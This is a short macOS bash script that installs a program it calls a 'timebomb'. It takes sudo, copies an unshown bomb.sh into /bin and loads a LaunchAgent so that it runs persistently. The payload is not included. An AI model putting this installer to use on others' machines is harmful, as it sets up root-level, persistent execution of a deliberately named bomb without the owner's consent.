#!/bin/bash

# Code is poetry
# Created by Nick aka black.dragon74

# Script to install the timebomb
# Must be executed from the directory of bomb.sh

# Declare Vars
userDir=$(echo $HOME)
userLib=$userDir/Library
installLoc="/bin"

# Get root access
echo "Installing the timebomb..."
echo "Getting root elevation..."

# If root access failed, you should exit
isRoot=$(sudo id -u 2>/dev/null)
if [[ $isRoot == "0" ]]; then
	echo "Root access gained"
else
	echo "Root elevation failed. Aborting" && exit
fi

# Change directory to script execution dir and check for the required files
cd $(dirname $0)

# Check for bomb.sh and daemon
if [[ -e bomb.sh && -e org.nick.bombd.plist ]]; then
	echo "Installing files..."
	sudo cp bomb.sh $installLoc/tbomb
	cp org.nick.bombd.plist $userLib/LaunchAgents

	echo "Setting permissions..."
	sudo chmod a+x $installLoc/tbomb
	chmod 755 $userLib/LaunchAgents/org.nick.bombd.plist

	echo "Loading daeomn..."
	launchctl load $userLib/LaunchAgents/org.nick.bombd.plist

	echo "Done"

	exit 0
else
	echo "Required files not found, make sure you are running from the same dir as bomb.sh"
	exit 1
fi